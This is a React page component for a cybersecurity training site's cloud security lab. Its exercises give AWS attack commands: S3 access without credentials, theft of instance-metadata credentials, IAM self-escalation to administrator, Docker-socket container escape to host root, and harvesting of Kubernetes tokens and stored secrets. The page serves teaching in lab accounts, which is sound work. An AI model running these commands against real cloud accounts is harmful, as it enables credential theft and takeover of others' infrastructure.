'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff9500'
const dim = '#5a6a4a'
const border = '#3a2800'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: dim, letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040404', border: '1px solid ' + border, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '2.5rem', marginBottom: '0.75rem' }}>
    <span style={{ color: border, marginRight: '8px' }}>//</span>{children}
  </h2>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)

const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,149,0, 0.06)', border: '1px solid rgba(255,149,0, 0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0 }}>{children}</p>
  </div>
)

export default function CloudSecurityLab() {
  return (
    <div style={{ minHeight: '100vh', background: '#0c0800', color: '#c8c0b8', fontFamily: 'system-ui, sans-serif', padding: '2rem' }}>
      <div style={{ maxWidth: '860px', margin: '0 auto' }}>

        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, marginBottom: '2rem', letterSpacing: '0.1em' }}>
          <Link href="/" style={{ color: dim, textDecoration: 'none' }}>GHOSTNET</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <Link href="/modules/cloud-security" style={{ color: dim, textDecoration: 'none' }}>CLOUD SECURITY</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <span style={{ color: accent }}>LAB</span>
        </div>

        <div style={{ marginBottom: '2.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: dim, letterSpacing: '0.2em', marginBottom: '0.5rem' }}>HANDS-ON LAB</div>
          <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: 0 }}>Cloud Security Lab</h1>
          <p style={{ color: '#7a6a4a', marginTop: '0.75rem', fontSize: '0.9rem' }}>
            AWS enumeration, S3 exploitation, IMDS credential theft, IAM escalation, and container escape.{' '}
            <Link href="/modules/cloud-security" style={{ color: accent, textDecoration: 'none' }}>Back to Concept &rarr;</Link>
          </p>
        </div>

        <div style={{ background: '#0a0500', border: '1px solid ' + border, borderRadius: '8px', padding: '1.5rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, letterSpacing: '0.15em', marginBottom: '0.75rem' }}>LAB OVERVIEW</div>
          <P>Work through AWS identity enumeration, S3 bucket analysis, EC2 instance metadata abuse, IAM privilege escalation, container escape vectors, and cloud infrastructure auditing. Use a dedicated CTF or lab AWS account — never your production environment.</P>
          <div style={{ background: 'rgba(255,80,80,0.06)', border: '1px solid rgba(255,80,80,0.2)', borderRadius: '4px', padding: '0.75rem 1rem', marginTop: '0.75rem' }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#ff5050' }}>LEGAL WARNING — </span>
            <span style={{ fontSize: '0.82rem', color: '#8a7a7a' }}>Only test against AWS accounts you own or have explicit written authorization to test. Unauthorized access to cloud infrastructure is a federal crime under the CFAA.</span>
          </div>
        </div>

        <H2>01 — AWS CLI Setup and Identity Enumeration</H2>
        <P>Configure the AWS CLI with lab credentials and enumerate your identity, attached policies, and available roles. This is the first thing an attacker does after obtaining AWS keys.</P>
        <Note>AWS Access Key IDs starting with AKIA are long-term credentials. Keys starting with ASIA are temporary (STS session) credentials. When you run aws sts get-caller-identity, the ARN tells you exactly who the key belongs to and in which account.</Note>
        <Pre label="// EXERCISE 1 — CONFIGURE AWS CLI AND ENUMERATE IDENTITY">{`# Install AWS CLI:
pip install awscli

# Configure with lab credentials (use a CTF or lab account, NOT production):
aws configure
# Enter when prompted:
# AWS Access Key ID: YOUR_KEY_ID_HERE
# AWS Secret Access Key: YOUR_SECRET_HERE
# Default region: us-east-1
# Default output: json

# Check who you are:
aws sts get-caller-identity

# Expected output:
# {
#   "UserId": "AIDA...",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/lab-user"
# }

# List all IAM users in the account:
aws iam list-users

# List policies attached to your user:
aws iam list-attached-user-policies --user-name lab-user

# List inline policies on your user:
aws iam list-user-policies --user-name lab-user

# Get the document for a specific inline policy:
aws iam get-user-policy --user-name lab-user --policy-name inline-policy-name

# Enumerate all roles in the account:
aws iam list-roles --query "Roles[*].RoleName"`}</Pre>

        <H2>02 — S3 Bucket Enumeration and Exploitation</H2>
        <P>List accessible buckets, attempt unauthenticated access, download contents, and search for leaked secrets in configuration files, environment files, and source code.</P>
        <Note>The --no-sign-request flag tells the AWS CLI to make the request without any credentials. If a bucket is publicly accessible, this still works. Many real-world breaches have come from misconfigured S3 buckets exposed this way.</Note>
        <Pre label="// EXERCISE 2 — FIND AND ACCESS S3 BUCKETS">{`# List all buckets you have access to:
aws s3 ls

# List contents of a specific bucket:
aws s3 ls s3://your-lab-bucket-name

# Try unauthenticated access (no credentials at all):
aws s3 ls s3://your-lab-bucket-name --no-sign-request

# Download a single file:
aws s3 cp s3://your-lab-bucket-name/README.txt ./README.txt

# Download the entire bucket:
aws s3 sync s3://your-lab-bucket-name ./local-copy --no-sign-request

# Check bucket ACL (who has what permissions):
aws s3api get-bucket-acl --bucket your-lab-bucket-name

# Check bucket policy (JSON document describing access rules):
aws s3api get-bucket-policy --bucket your-lab-bucket-name

# Test write access (fails on read-only buckets):
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://your-lab-bucket-name/test.txt --no-sign-request

# Search downloaded files for AWS keys and secrets:
grep -r "aws_access_key" ./local-copy/ 2>/dev/null
grep -r "AKIA\|ASIA" ./local-copy/ 2>/dev/null
grep -r "password\|secret\|api_key" ./local-copy/ 2>/dev/null`}</Pre>

        <H2>03 — IMDS Metadata Exploitation</H2>
        <P>Access the EC2 Instance Metadata Service (IMDS) from inside an EC2 instance to steal temporary IAM credentials attached to the instance role. This is a critical post-exploitation step when you gain access to any EC2 machine.</P>
        <Note>IMDSv1 requires no authentication at all — any process on the instance can query 169.254.169.254. IMDSv2 requires a session token obtained via a PUT request first. Many older EC2 instances still run IMDSv1. This is why Server-Side Request Forgery (SSRF) vulnerabilities are so severe in cloud environments.</Note>
        <Pre label="// EXERCISE 3 — STEAL CREDENTIALS VIA INSTANCE METADATA">{`# This exercise requires an EC2 instance (use a free tier lab account)
# SSH into your EC2 instance first, then run these commands from inside it

# Access the metadata root endpoint (IMDSv1 — no auth required):
curl http://169.254.169.254/latest/meta-data/

# Get instance identity information:
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/placement/region

# Find what IAM role is attached to this instance:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials for the attached role:
# Replace ROLE_NAME with the value returned by the previous command
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Expected response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }

# Export the stolen credentials as environment variables:
export AWS_ACCESS_KEY_ID=ASIA_VALUE_HERE
export AWS_SECRET_ACCESS_KEY=SECRET_VALUE_HERE
export AWS_SESSION_TOKEN=TOKEN_VALUE_HERE

# Verify the stolen credentials work:
aws sts get-caller-identity

# Enumerate what the role can do:
aws s3 ls
aws ec2 describe-instances --region us-east-1`}</Pre>

        <H2>04 — IAM Privilege Escalation</H2>
        <P>Escalate from a low-privilege IAM user to administrator by exploiting overly permissive IAM policies. There are over 20 known IAM escalation paths — this exercise covers the most common: self-attaching a managed policy.</P>
        <Pre label="// EXERCISE 4 — ESCALATE PRIVILEGES IN AWS IAM">{`# Scenario: low-privilege IAM user has the iam:AttachUserPolicy permission
# Goal: escalate to AdministratorAccess

# Check your current permissions:
aws iam list-attached-user-policies --user-name low-priv-user

# Check if iam:AttachUserPolicy is allowed for your user:
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/low-priv-user \
  --action-names iam:AttachUserPolicy

# Attach the AWS managed AdministratorAccess policy to yourself:
aws iam attach-user-policy \
  --user-name low-priv-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Verify the escalation worked:
aws iam list-attached-user-policies --user-name low-priv-user

# Test your new admin access:
aws iam list-users
aws ec2 describe-instances
aws s3 ls

# Use Pacu for automated privilege escalation scanning:
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py

# In the Pacu console (interactive):
# import_keys --all
# run iam__enum_permissions
# run iam__privesc_scan`}</Pre>

        <H2>05 — Container Environment Detection and Escape</H2>
        <P>Detect whether you are running inside a container, enumerate capabilities and mount points, and attempt escape via the Docker socket or privileged container misconfigurations.</P>
        <Note>The most common container escape is a mounted Docker socket at /var/run/docker.sock. If a container has access to this socket, it can spin up a new privileged container with the host filesystem mounted — giving full host access. Always check for this during cloud post-exploitation.</Note>
        <Pre label="// EXERCISE 5 — DETECT AND ESCAPE CONTAINERS">{`# Check if you are inside a Docker container:
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv 2>/dev/null && echo "IN DOCKER" || echo "NOT IN DOCKER"

# Check kernel namespaces:
ls -la /proc/1/ns/

# Check available Linux capabilities:
capsh --print 2>/dev/null || cat /proc/self/status | grep CapEff

# Check for a mounted Docker socket (the most critical escape vector):
ls -la /var/run/docker.sock 2>/dev/null

# If the Docker socket is present — escape to host:
# docker -H unix:///var/run/docker.sock ps
# docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu /bin/sh
# Inside the new container: chroot /host
# You are now on the host filesystem with root access

# Check for Kubernetes service account token:
ls /var/run/secrets/kubernetes.io/ 2>/dev/null

# Read the Kubernetes service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Query the Kubernetes API using the token:
# Store the token in a shell variable first, then use it:
curl -sSk \
  -H "Authorization: Bearer K8S_TOKEN_HERE" \
  https://kubernetes.default.svc/api/v1/pods

# Check environment variables for embedded secrets:
env | grep -i "key\|secret\|pass\|token\|aws"`}</Pre>

        <H2>06 — Cloud Recon with Automated Tools</H2>
        <P>Use ScoutSuite and Prowler to generate comprehensive security audits of an AWS environment. Then run manual enumeration queries to find misconfigured resources quickly.</P>
        <Pre label="// EXERCISE 6 — ENUMERATE CLOUD INFRASTRUCTURE">{`# Install ScoutSuite (multi-cloud security auditor):
pip install scoutsuite

# Run AWS audit (reads all resources, generates HTML report):
python3 scout.py aws

# Install Prowler (AWS CIS benchmark tool):
pip install prowler
prowler aws

# Manual enumeration — EC2 instances table:
aws ec2 describe-instances \
  --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name]" \
  --output table

# Find security groups allowing all inbound traffic from the internet:
aws ec2 describe-security-groups \
  --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]].[GroupId,GroupName]"

# List all Secrets Manager entries:
aws secretsmanager list-secrets

# Read a specific secret (replace SECRET_NAME):
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# Check if CloudTrail logging is enabled:
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name trail-name

# Find publicly accessible RDS databases:
aws rds describe-db-instances \
  --query "DBInstances[?PubliclyAccessible==\`true\`].[DBInstanceIdentifier,Endpoint.Address]"`}</Pre>

        <H2>Check Your Understanding</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', marginBottom: '2rem' }}>
          {[
            '1. What is the difference between an AKIA key and an ASIA key in AWS, and how are each obtained?',
            '2. Why is an SSRF vulnerability particularly dangerous when an application runs on EC2?',
            '3. What IAM permission allows a low-privilege user to escalate to admin by attaching policies to themselves?',
            '4. What is the key indicator that a container has an escape path via the Docker socket?',
            '5. What does ScoutSuite check that manual AWS CLI enumeration would miss, and why use both?',
          ].map((q, i) => (
            <div key={i} style={{ background: '#0a0500', border: '1px solid ' + border, borderRadius: '4px', padding: '0.85rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.8rem', color: '#9a8a6a' }}>{q}</div>
          ))}
        </div>

        <H2>Further Practice</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '3rem' }}>
          {[
            { label: 'TryHackMe — Cloud Security Fundamentals', url: 'https://tryhackme.com/room/cloudsecurityfundamentals' },
            { label: 'HTB Academy — Attacking Cloud Infrastructure', url: 'https://academy.hackthebox.com/module/details/168' },
            { label: 'flaws.cloud — AWS Security Challenge (Levels 1-6)', url: 'http://flaws.cloud' },
            { label: 'flaws2.cloud — Attacker and Defender Paths', url: 'http://flaws2.cloud' },
          ].map((r, i) => (
            <a key={i} href={r.url} target="_blank" rel="noopener noreferrer" style={{ display: 'block', background: '#0a0500', border: '1px solid ' + border, borderRadius: '4px', padding: '0.75rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>
              &rarr; {r.label}
            </a>
          ))}
        </div>

        <div style={{ borderTop: '1px solid ' + border, paddingTop: '1.5rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Link href="/modules/cloud-security" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: dim, textDecoration: 'none' }}>&larr; Back to Concept</Link>
          <Link href="/modules" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>All Modules &rarr;</Link>
        </div>

      </div>
    </div>
  )
}
